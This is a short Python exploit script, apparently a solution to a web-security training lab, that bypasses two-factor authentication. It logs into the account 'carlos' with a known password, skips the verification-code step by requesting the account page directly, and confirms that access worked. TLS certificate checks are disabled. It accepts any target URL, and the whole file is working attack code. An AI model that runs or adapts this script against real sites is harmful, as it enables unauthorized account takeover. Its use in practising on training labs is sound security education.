import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)



def access_carlos_account(s, url):
    # Log into Carlos's account
    print("(+) Logging into Carlos's account and bypassing 2FA verification...")
    login_url = url + "/login"
    login_data = {"username": "carlos", "password": "montoya"}
    r = s.post(login_url, data=login_data, allow_redirects=False, verify=False)

    # Confirm bypass
    myaccount_url = url + "/my-account"
    r = s.get(myaccount_url, verify=False)
    if "Log out" in r.text:
        print("(+) Successfully bypassed 2FA verification.")
    else:
        print("(-) Exploit failed.")
        sys.exit(-1)

def main():
    # Get URL from user input
    url = input("Please enter the target URL (e.g., http://www.example.com): ").strip()
    
    # Basic URL validation
    if not url.startswith("http://") and not url.startswith("https://"):
        print("(-) Error: URL must start with http:// or https://")
        sys.exit(-1)
    
    s = requests.Session()
    access_carlos_account(s, url)

if __name__ == "__main__":
    main()